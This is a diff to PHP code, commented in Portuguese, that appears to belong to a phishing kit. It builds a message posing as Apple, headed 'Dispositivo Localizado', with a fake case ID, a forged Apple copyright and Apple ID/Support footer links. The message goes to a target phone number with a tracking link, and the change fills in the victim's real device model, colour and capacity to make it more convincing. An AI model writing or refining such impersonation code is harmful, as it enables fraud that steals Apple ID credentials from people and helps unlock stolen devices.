@@ -100,13 +100,17 @@ if (true) {
         '{numero}' => $target_number // O número que recebe a mensagem aparece aqui
     ];
     
-    // Template sem o link (o link será injetado pelo bot apenas nas respostas automáticas)
+    // Template com o novo rodapé incluído
     $template = "*Dispositivo Localizado*\n" .
                 "> Dispositivo: *{modelo} {cor} {capacidade}*\n" .
                 "> Número de emergencia: *({numero})*\n" .
                 "> ID de caso: *000-A946*\n" .
                 "Para iniciar o processo de recuperação, digite *Ajuda*\n" .
-                "> *Copyright ©️ 2025 Apple Inc*";
+                "> *Copyright ©️ 2025 Apple Inc*\n" .
+                "> | Apple ID | Support | Privacy Policy";
+    
+    // Substitui as variáveis no texto para enviar dados reais e não placeholders
+    $finalMessage = strtr($template, $vars);
     
     $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
     $baseUrl = $protocol . "://" . $_SERVER['HTTP_HOST'];
@@ -115,7 +119,7 @@ if (true) {
     $payload = [
         'session' => $session_id,
         'number' => $target_number,
-        'message' => $template, // Envia o texto sem modificar (sem strtr)
+        'message' => $finalMessage, // Agora envia o texto processado corretamente
         'mediaPath' => $publicMediaPath,
         'trackLink' => $trackLink,
         'language' => $idioma
